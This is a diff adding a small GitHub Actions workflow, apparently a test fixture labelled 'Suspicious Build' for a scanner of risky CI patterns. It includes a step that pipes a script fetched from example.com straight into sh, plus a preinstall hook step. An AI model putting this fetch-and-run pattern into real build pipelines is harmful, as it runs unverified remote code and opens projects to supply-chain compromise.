@@ -1,0 +1,16 @@
+# Workflow with suspicious script patterns
+name: Suspicious Build
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Suspicious preinstall
+        run: npm run preinstall
+      - name: Piped curl
+        run: curl https://example.com/script.sh | sh
